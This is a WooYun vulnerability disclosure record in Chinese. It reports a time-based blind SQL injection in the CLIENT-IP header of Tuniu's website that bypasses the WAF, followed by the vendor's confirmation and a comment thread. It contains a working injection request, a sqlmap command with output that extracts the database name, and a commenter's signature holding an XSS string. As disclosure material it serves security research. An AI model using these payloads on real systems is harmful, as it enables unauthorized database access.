{"id": 8546, "wybug_id": "wooyun-2015-0122321", "wybug_title": "途牛旅游网主站SQL时间盲注+无视WAF", "wybug_corp": "途牛旅游网", "wybug_author": "Jannock", "wybug_date": "2015-06-23 17:29", "wybug_open_date": "2015-08-07 17:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-07：\t细节向公众公开  简要描述： 途牛旅游网主站SQL时间盲注+无视WAF。PS：waf越做越变态了。 详细说明：  \nGET /Partner_redirect.php HTTP/1.1Host: www.tuniu.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCLIENT-IP: 127.0.0.1'+if((1=1 * ),(select 1 from information_schema.tables),(select 1 from information_schema.tables))+'Content-Length: 0Connection: close\n   漏洞证明：  \npython sqlmap.py -r 1.txt --dbms=mysql --technique=T --current-db    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 17:18:43[17:18:43] [INFO] parsing HTTP request from '1.txt'custom injection marking character ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] y[17:18:44] [INFO] testing connection to the target URLsqlmap got a 302 redirect to 'http://www.tuniu.com'. Do you want to follow? [Y/n] nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: (custom) HEADERParameter: CLIENT-IP #1*    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: 127.0.0.1'+if((1=1 ) AND SLEEP(5) AND (4256=4256 ),(select 1 from information_schema.tables),(select 1 from information_schema.tables))+'---[17:18:50] [INFO] testing MySQLdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n] y[17:19:03] [INFO] confirming MySQL[17:19:03] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors[17:19:13] [INFO] adjusting time delay to 1 second due to good response times[17:19:13] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL >= 5.0.0[17:19:13] [INFO] fetching current database[17:19:13] [INFO] retrieved: tuniucurrent database:    'tuniu'\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 Jannock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-06-23 17:53 厂商回复： 谢谢一哥关注途牛安全，我们正在紧急修复，啥都不说了。。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-23 17:31 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  一哥NB    \n     2015-06-23 17:31 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  哈哈哈，关注    \n     2015-06-23 17:35 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  只是想不想发的问题    \n     2015-06-23 17:35 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  顶一哥    \n     2015-06-23 17:35 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  前些日子找一哥光顾的各大厂商，一哥说回头一个一个补上。    \n     2015-06-23 17:35 |    \t\tD_in \t\t\t( 普通白帽子  |\t\t\t        Rank:413 漏洞数:62        | 到我嘴里来)\t\t \n  关注，一哥的注入    \n     2015-06-23 17:37 |    \t\t途牛旅游网(乌云厂商)\t\t \n  一哥别忘记我，洗好等你哟！(✿◡‿◡)    \n     2015-06-23 17:37 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  @途牛旅游网 哈哈，节操碎了。    \n     2015-06-23 17:41 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  一个个补上    \n     2015-06-23 17:44 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2738 漏洞数:547        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  一哥NB    \n     2015-06-23 17:54 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  一哥屌屌的！    \n     2015-06-23 17:57 |    \t\t途牛旅游网(乌云厂商)\t\t \n  @途牛旅游网 哪来的泼猴，竟敢冒充我！    \n     2015-06-23 18:20 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  @途牛旅游网 哪来的泼猴，竟敢冒充我！    \n     2015-06-23 20:13 |    \t\tMr.R \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:14        | 求大神带我飞 qq2584110147)\t\t \n  @途牛旅游网 哪来的泼猴 竟敢冒充我    \n     2015-06-23 20:24 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1107 漏洞数:200        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  @途牛旅游网 你们不是一个人么，    \n     2015-06-23 20:51 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  @途牛旅游网 一定是精神分裂症了    \n     2015-06-23 21:58 |    \t\t0c0c0f \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:15        | My H34rt c4n 3xploit 4ny h0les!)\t\t \n  @途牛旅游网 哪来的泼猴 竟敢冒充我     \n     2015-06-24 07:36 |    \t\tfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:664 漏洞数:79        | 想刷个6D)\t\t \n  希望没重复    \n     2015-07-09 11:35 |    \t\tD_in \t\t\t( 普通白帽子  |\t\t\t        Rank:413 漏洞数:62        | 到我嘴里来)\t\t \n  还不公开给看看啊    \n     2015-08-07 18:53 |    \t\t鹤冲天 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 哎~)\t\t \n  @途牛旅游网   你名字后面大大的（乌云厂商）暴露了你是一个人，精神分裂无疑，。。。一定是厂商发现删不掉回复才。。。@DloveJ    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}